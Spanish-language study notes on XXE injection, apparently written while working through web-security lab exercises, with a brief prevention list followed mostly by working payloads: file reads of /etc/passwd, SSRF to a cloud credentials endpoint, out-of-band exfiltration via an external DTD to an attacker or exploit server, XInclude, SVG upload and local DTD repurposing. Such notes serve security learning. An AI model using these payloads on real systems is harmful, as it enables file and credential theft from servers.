
-----------
# Definición

>**XML External Entity Injection (XXE)** es una falla en el análisis de XML que permite a un atacante interferir con el procesamiento de datos XML mediante la inclusión de entidades externas personalizadas.

## Puede usarse para

- *Leer* archivos arbitrarios del sistema (por ejemplo, `/etc/passwd`)
    
- Realizar ataques de denegación de servicio (*DoS*)
    
- Realizar *escaneos* de red interna
    
- *Exfiltrar* datos internos

## Prevención:

- *Desactivar* el soporte para entidades externas en el parser XML.
    
- Usar *bibliotecas* que no permiten XXE por defecto.
    
- Validar y *sanitizar* el XML de entrada.
    
- *Evitar* el uso de *parsers* XML que no estén configurados para entornos seguros.

-----------
# Explotación

## Leer archivos

- Si se manda una solicitud con un contenido XML, se puede tratar de inyectar una entidad:
	``` java
	<!DOCTYPE foo [ <!ENTITY test "testing"> ] >
	```
	y luego referenciarla de la forma:
	``` java
	&test;
	```
	Si se acontece un *error* y se ve *reflejado* el valor de test (testing), se puede tratar de explotar un LFI cargando una entidad externa:
	``` java
	<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ] >
	```
	De esta forma, el contenido de la petición sería el siguiente:
	``` xml
	<?xml version="1.0" encoding="UTF-8"?>
		<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ] >
		<stockCheck>
			<productId>
				&xxe;
			</productId>
			<storeId>
				1
			</storeId>
		</stockCheck>
	```

## Realizar ataques SSRF

- Del mismo modo que para leer archivos, se puede apuntar a archivos expuestos de la red interna del servidor.
	``` java
	<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ] >
	```

-----------
# Blind XXE

## Out-of-band interaction

- Se realiza de la misma manera que como con ataque SSRF, pero apuntando a un dominio propio:
	``` java
	<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.com"> ] >
	```
	
### Parameter entities
	
- Se realiza una **expansión** para cargar la entidad desde el propio *DTD*, sin necesidad de referenciar la entidad en el cuerpo del XML.
	``` java
	<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker.com"> %xxe; ] >
	```

## Data exfiltration via external DTD

- Para exfiltrar información se puede inyectar en el DTD una entidad de parámetro que cargue un recurso en un servidor de atacante.

	En ese servidor, se pueden incluir las siguientes entidades para cargar un archivo de la máquina víctima:

	``` java
	<!ENTITY % file SYSTEM "file:///etc/hostname">
	<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://exploit-0ad3009c03b4b2d9825b74eb015d0007.exploit-server.net/?hostname=%file;'>">
	%eval;
	%exfil;
	```

## Data exfiltration via visible error messages

- Si el parse XML devuelve errores visibles, se puede tratar de añadir un *archivo que no existe* concatenado del archivo a leer. De esta forma, se acontecerá un **FileNotFoundException**, mostrando en el error el archivo a leer.

	Se realiza con una entidad de parámetro externa que apunta a un recurso en la máquina de atacante con las entidades siguientes:
	``` java
	<!ENTITY % file SYSTEM "file:///etc/passwd">
	<!ENTITY %eval "<!ENTITY &#x25; exfil SYSTEM 'file:///handler/%file;'">
	%eval;
	%exfil;
	```

----------
# XInclude

Si el input del usuario se vuelca sobre una estructura XML que después es parseada, se puede probar a incluir archivos mediante XInclude (si el servidor lo soporta):
``` xml
<xxe xmlns:xi="http://www.w3.org/2001/XInclude">
	<xi:include parse="text" href="file:///etc/passwd" />
</xxe>
```

----------
# File uploads

Se puede explotar un XXE en subidas de archivos en casos concretos donde el archivo es pasado por un **parse** que lea e interprete el contenido XML.

- Ejemplo:

	En este ejemplo, en la subida de imagen, el archivo se pasa por la librería *Apache Batik*, que interpreta imágenes SVG.

	En los archivos SVG se puede incluir contenido XML. De este modo, se puede leer archivos de la máquina:
	``` xml
	<?xml version="1.0" standalone="yes"?>
	<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
	<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
		<text font-size="16" x="0" y="16">&xxe;</text>
	</svg>
	```

---------
# Local DTD repurposing

Si el parser no permite cargar un DTD externo, se puede intentar cargar un DTD local de la máquina e intentar *modificar la definición de una de las entidades* para que cuando se expanda ejecute las entidades inyectadas.

- Ejemplo:

	La máquina utiliza un entorno de escritorio GNOME, que tiene un DTD en ``/usr/share/yelp/dtd/docbookx.dtd``.

	En este DTD hay una entidad definida como ``ISOamso``, que se expande en ese mismo archivo.

	Entonces, se puede introducir el siguiente código para modificar esta entidad y cargar el ``/etc/passwd`` via mensajes de error:
	``` java
	<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; exfil SYSTEM &#x27;file:///handler/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;exfil;
  '>
  %local_dtd;
  ]>
	```